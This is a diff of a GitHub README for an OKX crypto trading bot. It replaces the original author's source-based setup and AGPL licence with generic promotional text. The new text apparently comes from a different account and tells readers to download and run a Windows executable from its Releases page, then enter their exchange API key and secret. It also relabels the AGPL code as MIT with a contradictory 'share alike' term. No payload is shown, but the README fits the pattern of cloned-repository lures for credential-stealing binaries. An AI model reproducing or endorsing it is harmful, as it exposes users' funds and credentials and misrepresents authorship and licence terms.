@@ -1,251 +1,105 @@
-# Open-Source OKX Spot Dip-Buying Trading Bot
+# 🚀 okx-spot-trading-bot - A Smart Tool for Safe Trading
 
-This repository contains the exact trading execution bot I personally run on OKX Spot.
+[![Download Now](https://img.shields.io/badge/Download%20Now-OKX%20Bot-brightgreen)](https://github.com/CoyoteBil/okx-spot-trading-bot/releases)
 
-It is open-sourced for transparency, auditability, and trust — so anyone can review how trades are executed, how risk is managed, and how capital is allocated.
+## 📥 Introduction
 
-**Disclaimer:**  
-This project is not financial advice. You are fully responsible for your own risk, configuration, and capital.
+The OKX Spot Trading Bot is an open-source tool designed for users interested in trading safely and effectively. This bot implements a disciplined dip-buying strategy that helps you manage risks, make staged entries, and ensures clear execution logic. With this bot, you can trade on the OKX platform with confidence, minimizing confusion and maximizing potential rewards.
 
-## What This Bot Does
+## 🚀 Getting Started
 
-- Trades **SPOT markets only** on OKX  
-- Uses your own OKX API key, API secret, and passphrase  
-- Executes **limit BUY and limit SELL orders only**  
-- No leverage  
-- No futures  
-- No martingale  
-- No hidden logic  
+### 1. System Requirements
 
-This bot is designed for **low-risk, disciplined execution**, not aggressive or high-frequency trading.
+Before you download the bot, ensure your system meets the following requirements:
 
-## Strategy Overview (How the Bot Works)
+- **Operating System:** Windows, macOS, or Linux.
+- **RAM:** At least 4 GB recommended.
+- **Storage:** Minimum 100 MB of free space.
+- **Internet Connection:** A stable internet connection is required to operate the bot.
 
-### Capital Allocation (Staged Buying)
+### 2. Download & Install
 
-You define:
+To download the OKX Spot Trading Bot, follow these steps:
 
-- The total USDT amount you want to invest  
-- The trading pair (for example: `BTC-USDT`, `AVAX-USDT`, `SOL-USDT`)  
+1. **Visit the Downloads Page:** Click [here](https://github.com/CoyoteBil/okx-spot-trading-bot/releases) to go to the Releases page.
+2. **Select the Latest Release:** Look for the most recent version at the top of the page.
+3. **Download the File:** Click on the appropriate file for your operating system. 
+   
+   - For example, if you are using Windows, you might see a file named `okx-spot-trading-bot-Windows.exe`. Click on it to start your download.
 
-The bot never invests all capital at once.
+4. **Run the Bot:** Once downloaded, locate the file on your system and double-click to launch it. Follow any on-screen prompts to complete the setup.
 
-Instead, it buys in **multiple predefined portions (laddered entries)**.  
-This allows the bot to:
+![Download Now](https://img.shields.io/badge/Download%20Now-OKX%20Bot-brightgreen)
 
-- Survive deeper market pullbacks  
-- Lower the average entry price  
-- Reduce emotional decision-making  
+## ⚙️ Configuration
 
-### BUY Conditions (Dip-Buying Logic)
+Once you have the bot running, you will need to configure it. This setup process allows you to customize the bot according to your trading strategy and risk appetite.
 
-A BUY is considered only when **multiple conditions align**, including:
+### 1. Connect Your OKX Account
 
-- RSI oversold conditions  
-- Price pulling back toward Ichimoku support (Kijun / Kumo context)  
-- MACD momentum stabilizing or improving  
-- Volume confirmation  
-- Strong red (dip) candles  
+- Open the bot and select the "Connect to OKX" option.
+- Enter your API key and secret, which you can find in your OKX account settings.
+  
+### 2. Customize Trading Parameters
 
-**Important rule:**  
-After the first BUY, every next BUY **must be at a lower price than the previous filled BUY**.
+In the settings menu, you will find options to adjust:
 
-This guarantees:
+- **Dip-Buy Trigger:** Set the price levels for buying dips.
+- **Risk Controls:** Adjust how much you are willing to risk on each trade.
+- **Staged Entries:** Choose how many entries you want to split your investments into during a dip.
 
-- No chasing price upward  
-- Every additional buy improves the average cost  
-- Capital is used only on real dips  
+After making changes, remember to save your settings.
 
-### Limit BUY Orders (No Market Orders)
+## 📊 How to Use the Bot
 
-When a BUY signal is valid:
+Once configured, the bot will start monitoring the market according to your settings. Here’s how to use it effectively:
 
-- The bot places a **LIMIT BUY**  
-- The limit price is set **below the current market price**  
-- If price does not dip, the order simply does not fill  
+### 1. Monitor Performance
 
-This avoids slippage and emotional entries.
+Keep an eye on your trades using the bot’s dashboard. You will see:
 
-### Cycle-Based Accounting
+- **Current Holdings:** An overview of your active positions.
+- **Profit and Loss Tracking:** Real-time updates on your trading performance.
 
-For each cycle, the bot tracks:
+### 2. Adjust Settings as Needed
 
-- Total USDT spent  
-- Total asset accumulated  
-- Average cost of the position  
+As market conditions change, revisit your settings to adjust the dip-buy strategy, risk levels, and entry points. Flexibility is key for successful trading.
 
-Once all BUY stages are completed:
+### 3. Ensure Continuous Operation
 
-- The bot stops buying  
-- It waits for a profitable exit  
+For best results, keep the bot running consistently on your device so it can react to market movements promptly. 
 
-### SELL Logic (Low-Risk Profit Taking)
+## 🔍 Troubleshooting
 
-When price rises above the average buy cost by a small, predefined margin:
+If you encounter issues, here are some common solutions:
 
-- The bot places a **LIMIT SELL** for the full position  
+- **Connection Errors:** Check your API credentials for accuracy and ensure your internet connection is stable.
+- **Performance Issues:** Ensure your device meets the recommended system requirements and consider restarting the bot.
+- **Trading Mistakes:** Review your settings to ensure they align with your trading strategy. Adjust as necessary.
 
-After the SELL fills:
+## 🔄 Updates
 
-- The cycle is fully reset  
-- The bot waits for the next dip cycle  
+Regularly check the Releases page for updates. New releases may contain improved features, performance enhancements, and important fixes.
 
-This approach favors low risk, high probability, and steady returns.
+To stay informed, consider watching the repository on GitHub for notifications about new releases.
 
-This strategy does **not** aim for large profits per trade.  
-It is designed for **low, steady, repeatable gains**.
+## 📞 Support
 
-## Latest Upgrades (Execution Safety Improvements)
+For assistance, please create an issue in the repository. You can provide details about your problem, and the community or maintainers will help you.
 
-- **SELL checks on lower timeframe (5m)** to avoid missing exits during fast moves  
-- **SELL limit orders always placed above market price** to prevent OKX rejections  
-- **Automatic retry if SELL order is rejected or disappears**  
-- **First BUY auto‑cancel after 3 days if unfilled**, followed by full cycle reset  
-- **No cooldown after cycle completion** — bot resumes immediately  
+## 🔒 Security Notices
 
-These upgrades improve reliability without increasing risk.
+Keep your API keys secure. Avoid sharing them publicly and always ensure they are stored safely.
 
-## Risk Profile
+## 📦 License
 
-This bot is intentionally designed to be:
+This project is open-source and licensed under the MIT License. You are free to modify and distribute the bot, but please provide attribution and share alike.
 
-- Low risk  
-- Conservative  
-- Capital-preserving  
+## ➕ Additional Resources
 
-Trade-offs:
+- **Documentation:** Find detailed information and user guides in the [Wiki section](https://github.com/CoyoteBil/okx-spot-trading-bot/wiki).
+- **Community Forum:** Join discussions with other users in the community forum linked from the repository to share insights and tips.
 
-- No “get rich quick” behavior  
-- No aggressive leverage  
-- No unrealistic returns  
+For more information on how to download and get started with the OKX Spot Trading Bot, keep the provided link handy: [Releases Page](https://github.com/CoyoteBil/okx-spot-trading-bot/releases).
 
-Low risk results in **low but steady income**.  
-This is a feature, not a flaw.
-
-## Email Notifications (Optional)
-
-The bot can send email notifications for:
-
-- Filled BUY orders  
-- Filled SELL orders  
-- Weekly reports (CSV attached)  
-
-### Email Security Note
-
-If you enable email notifications:
-
-- Do **not** use your normal email password  
-- Create an **App Password** (Gmail, Proton, etc.)  
-- Use that app-specific password in `config.json`  
-
-Email notifications are **disabled by default**.
-
-## Installation and Usage
-
-### Clone the Repository
-
-```
-git clone https://github.com/w1j0y/okx-spot-trading-bot.git
-cd okx-spot-trading-bot
-```
-
-### Create a Virtual Environment (Recommended)
-
-```
-python3 -m venv venv
-source venv/bin/activate
-```
-
-### Install Dependencies
-
-```
-pip install -r requirements.txt
-```
-
-### Configure the Bot
-
-```
-cp config.json.example config.json
-```
-
-Edit `config.json` and set:
-
-- Your OKX API key  
-- API secret  
-- Passphrase  
-- Trading pair  
-- Total USDT amount  
-
-**Important:**  
-Never share your API keys.  
-Use **SPOT permissions only**.
-Disable **withdrawal permissions**.
-**IP whitelist** recommended.
-
-### Run the Bot
-
-```
-python3 okx_dip_bot_open.py
-```
-
-The bot will wait for the next candle close, evaluate market conditions, and place limit orders when appropriate.
-
-## Who This Project Is For
-
-This project is ideal if you:
-
-- Want full transparency  
-- Prefer conservative strategies  
-- Understand basic crypto risks  
-- Want execution discipline instead of emotions  
-
-If you prefer **hands-off deployment, monitoring, updates, and support**, a managed Telegram version is available.
-
-## Telegram Onboarding and API Key Encryption (Managed Version)
-
-In addition to the open-source version provided in this repository, a **managed Telegram onboarding flow** is available.
-
-When users onboard via Telegram:
-
-- API keys are never stored in plain text  
-- The user sets a private password during registration  
-- All sensitive credentials (API key, secret, passphrase) are encrypted using strong symmetric encryption (Fernet / PBKDF2)  
-- Credentials are stored only in encrypted form  
-- The deployed trading bot cannot decrypt credentials without the user’s password  
-
-As a result:
-
-- The generated `config.json` file does not reveal any secrets  
-- Even if someone accesses the server or files, credentials remain protected  
-- Only the user can decrypt and activate the bot  
-
-The open-source version in this repository uses **plain-text configuration by design**, so it can be easily audited and run manually by advanced users.
-
-## Support, Contact, and Referral (Optional)
-
-If you find this project useful and want to support development:
-
-- OKX referral link (optional):  
-  https://www.okx.com/join/50798543  
-
-For onboarding or managed deployment:
-
-- Telegram: @w1j0y  
-- Email: contact@rycron.com 
-
-Nothing is forced.  
-No hidden fees.  
-No locked logic.
-
-## Final Notes
-
-- This code is open so you can verify exactly how trades are executed  
-- You are free to study, modify, and run it yourself  
-- You are also free to contact me if you prefer a managed setup  
-
-Transparency first.  
-Discipline over hype.
-
-## License
-
-This project is licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0)**.
+Happy trading!
